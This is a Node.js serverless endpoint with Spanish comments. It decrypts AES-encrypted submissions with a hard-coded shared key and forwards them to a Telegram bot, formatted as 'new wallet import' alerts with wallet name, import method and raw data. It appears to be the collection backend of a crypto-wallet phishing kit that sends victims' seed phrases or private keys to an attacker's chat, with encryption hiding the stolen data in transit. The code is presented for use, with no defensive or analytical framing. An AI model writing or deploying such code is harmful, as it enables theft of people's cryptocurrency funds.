const axios = require('axios');
const CryptoJS = require('crypto-js');

// LA MISMA clave que en el cliente
const ENCRYPTION_KEY = 'tu-clave-secreta-aqui-123456789';

// Descifrar datos
function decryptData(encryptedData) {
    try {
        const decryptedBytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
        const decryptedData = JSON.parse(decryptedBytes.toString(CryptoJS.enc.Utf8));
        return decryptedData;
    } catch (error) {
        return null;
    }
}

module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    try {
        const { message, encrypted, version } = req.body;

        // Código VIEJO (mantener compatibilidad)
        if (message && !encrypted) {
            const botToken = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;

            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
            });

            return res.status(200).json({ success: true });
        }

        // Código NUEVO (cifrado)
        if (encrypted) {
            // Descifrar datos
            const decryptedData = decryptData(encrypted);
            if (!decryptedData) {
                return res.status(400).json({ error: 'Datos inválidos' });
            }

            // Crear mensaje para Telegram
            const telegramMessage = `🔐 NUEVA IMPORTACIÓN DE WALLET

📝 Nombre del Wallet: ${decryptedData.walletName}
🔑 Método: ${decryptedData.importMethod}

📋 Datos:
${decryptedData.data}

⏰ Fecha: ${new Date().toLocaleString('es-ES')}`;

            const botToken = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;

            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: telegramMessage,
            });

            return res.status(200).json({ success: true });
        }

        return res.status(400).json({ error: 'Formato inválido' });

    } catch (error) {
        return res.status(500).json({ error: 'Error al enviar el mensaje.' });
    }
};
